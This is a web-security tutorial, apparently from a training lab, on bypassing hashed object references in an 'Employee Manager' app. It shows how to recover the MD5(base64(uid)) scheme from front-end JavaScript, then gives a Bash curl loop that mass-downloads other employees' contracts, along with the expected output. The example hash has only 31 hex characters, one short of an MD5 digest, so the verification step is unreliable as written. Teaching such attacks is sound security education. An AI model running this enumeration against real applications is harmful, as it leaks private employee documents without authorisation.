# Bypassing Encoded References

In some web applications, object references are not exposed in clear text but are instead hashed or encoded, making enumeration more challenging. However, with the right techniques, it is still possible to exploit these vulnerabilities. This guide will demonstrate how to bypass encoded references using an example from an Employee Manager web application.

**Example Scenario: Employee Contracts**

Consider the following URL for accessing employee contracts:

```
http://SERVER_IP:PORT/contracts.php
```

When you click on a contract link, such as `Employment_contract.pdf`, the application sends a POST request to `download.php` with a hashed contract parameter:

```
contract=cdd96d3cc73d1dbdaffa03c6cd7339b
```

This hash appears to be an MD5 hash, which is a one-way function, making it impossible to decode directly. To exploit this, we can try to find the original value that corresponds to this hash by testing various inputs (like user IDs, usernames, etc.) to see if any of their hashes match.

**Function Disclosure**

A common mistake in web applications is performing sensitive operations on the front end. In this case, the application uses a JavaScript function to calculate the hash for the contract parameter. The relevant JavaScript function might look like this:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Here, the function takes a user ID (`uid`), base64 encodes it, and then hashes it using MD5. For example, if the function is called with `downloadContract('1')`, the value being hashed is the base64 encoded string of `1`.

To verify this, you can run the following command to reproduce the hash:

```bash
echo -n 1 | base64 -w 0 | md5sum
```

This should yield the same hash as the one in the request:

```
cdd96d3cc73d1dbdaffa03c6cd7339b
```

**Mass Enumeration of Contracts**

Now that we understand how the hashing works, we can enumerate contracts for other employees by calculating the hashes for their user IDs and making POST requests to download their contracts.

1. **Bash Script for Mass Enumeration** We can create a Bash script to automate the process of downloading contracts for multiple employees. The script will calculate the MD5 hash for each user ID from 1 to 10 and send a POST request to download the corresponding contract.

```bash
#!/bin/bash

for i in {1..10}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done
```

2. **Running the Script** After saving the script (e.g., as `exploit.sh`), you can run it in your terminal:

```bash
bash ./exploit.sh
```

3. **Expected Output** The script will download the contracts for employees with IDs 1 through 10, saving them as PDF files in your current directory:

```
contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03c6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```
